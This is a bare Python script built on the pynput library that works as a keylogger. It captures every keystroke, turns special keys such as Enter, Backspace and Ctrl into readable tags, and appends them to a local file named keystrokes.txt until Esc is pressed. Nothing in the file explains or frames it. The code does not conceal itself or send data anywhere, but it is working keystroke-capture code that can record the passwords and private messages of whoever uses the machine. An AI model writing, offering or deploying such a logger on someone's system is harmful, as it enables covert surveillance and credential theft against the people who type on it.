from pynput import keyboard

# File to save keystrokes
LOG_FILE = "keystrokes.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    key_data = str(key)
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif key_data == 'Key.backspace':
        key_data = '[BACKSPACE]'
    elif key_data == 'Key.shift':
        key_data = '[SHIFT]'
    elif key_data == 'Key.ctrl_l':
        key_data = '[CTRL]'
    elif key_data == 'Key.alt_l':
        key_data = '[ALT]'
    elif key_data == 'Key.esc':
        key_data = '[ESC]'
    elif key_data == 'Key.tab':
        key_data = '[TAB]'
    else:
        key_data = key_data.replace("'", "")
    
    with open(LOG_FILE, "a") as f:
        f.write(key_data)

# Function to handle key press events
def on_press(key):
    try:
        write_to_log(key)
    except AttributeError:
        print("Special key {0} pressed".format(key))

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
